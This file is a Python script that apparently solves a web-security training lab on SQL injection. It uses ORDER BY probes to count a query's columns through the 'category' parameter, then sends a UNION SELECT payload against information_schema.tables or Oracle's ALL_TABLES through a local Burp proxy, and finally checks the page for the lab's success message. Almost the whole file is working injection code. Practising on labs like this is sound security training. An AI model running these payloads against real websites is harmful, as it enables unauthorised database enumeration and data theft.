import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def is_num_col_equal(s, url, path, payload, num: int):
    sql_injection = f"'+ORDER+BY+{num}--%20"
    target_url = url + path + '?' + payload + sql_injection
    r = s.get(target_url)
    if r.status_code == 200:
        return True
    return False

def query(s, url, path, payload, isOracle, columns):
    sql_injection = f"'UNION+SELECT+{",+".join(columns)}+FROM+{'ALL_TABLES' if isOracle else 'information_schema.tables'}--%20"
    target_url = url + path + '?' + payload + sql_injection
    r = s.get(target_url)
    

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]

    PATH = '/filter'
    PAYLOAD = 'category=Accessories'
    IS_ORACLE = False

    num_column = 0
    for i in range(1, 20):
        if is_num_col_equal(s, url, PATH, PAYLOAD, i):
            num_column = i
        else: break
    print(f'[+] Finish test column, number of columns = {num_column}')

    columns = ['NULL'] * num_column
    query(s, url, PATH, PAYLOAD, IS_ORACLE, columns)
    check_solved_lab(s, url)


if __name__ == '__main__':
    main()